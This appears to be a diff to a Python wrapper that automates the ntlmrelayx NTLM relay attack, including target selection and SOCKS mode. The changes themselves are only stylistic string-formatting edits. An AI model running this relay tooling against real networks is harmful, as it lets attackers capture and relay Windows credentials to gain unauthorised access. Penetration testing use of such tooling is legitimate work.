@@ -1,5 +1,4 @@
-"""ntlmrelayx automation — NTLM relay with auto-targeting and attack selection."""
-from __future__ import annotations
+"""ntlmrelayx automation  -  NTLM relay with auto-targeting and attack selection."""
 import subprocess
 import sys
 import shutil
@@ -64,16 +63,15 @@ def run(args: Any) -> int:
     else:
         cmd.append("--socks")
 
-    print("[*] ntlmrelayx: attack={}, targets={}".format(
-        attack, targets_file or target_host))
+    print(f"[*] ntlmrelayx: attack={attack}, targets={targets_file or target_host}")
     print("[*] Command: {}".format(" ".join(cmd)))
 
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, bufsize=1)
-        print("[+] ntlmrelayx running (PID {}) — waiting for auth...".format(proc.pid))
+        print(f"[+] ntlmrelayx running (PID {proc.pid})  -  waiting for auth...")
         for line in proc.stdout:
-            print("  {}".format(line.rstrip()))
+            print(f"  {line.rstrip()}")
             if "authenticat" in line.lower() or "success" in line.lower():
                 break
         return 0
@@ -81,5 +79,5 @@ def run(args: Any) -> int:
         print("\n[*] Relay stopped")
         return 0
     except Exception as exc:
-        print("[-] ntlmrelayx error: {}".format(exc), file=sys.stderr)
+        print(f"[-] ntlmrelayx error: {exc}", file=sys.stderr)
         return 1
